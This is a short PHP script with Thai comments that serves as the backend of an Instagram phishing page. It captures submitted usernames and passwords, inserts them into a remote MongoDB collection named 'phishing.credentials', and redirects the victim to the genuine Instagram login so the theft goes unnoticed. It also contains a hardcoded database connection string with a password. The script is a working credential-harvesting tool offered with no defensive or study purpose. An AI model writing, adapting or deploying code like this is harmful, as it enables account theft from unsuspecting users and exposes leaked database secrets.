<?php
require 'vendor/autoload.php';

use MongoDB\Client;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($username && $password) {
        try {
            $client = new Client("mongodb+srv://ig-login:C1gd6Iec6MX2LXUD@ig-login.fqd6tee.mongodb.net/");
            $collection = $client->phishing->credentials;

            $collection->insertOne([
                'username' => $username,
                'password' => $password
            ]);

            // ไม่ echo อะไรออกไปก่อน header
            header("Location: https://www.instagram.com/accounts/login/");
            exit();

        } catch (Exception $e) {
            // ยังไม่ใช้ header → แสดงข้อความได้
            echo "เกิดข้อผิดพลาด: " . $e->getMessage();
        }
    } else {
        echo "กรุณากรอก username และ password ให้ครบถ้วน";
    }
} else {
    echo "วิธีการส่งข้อมูลไม่ถูกต้อง";
}
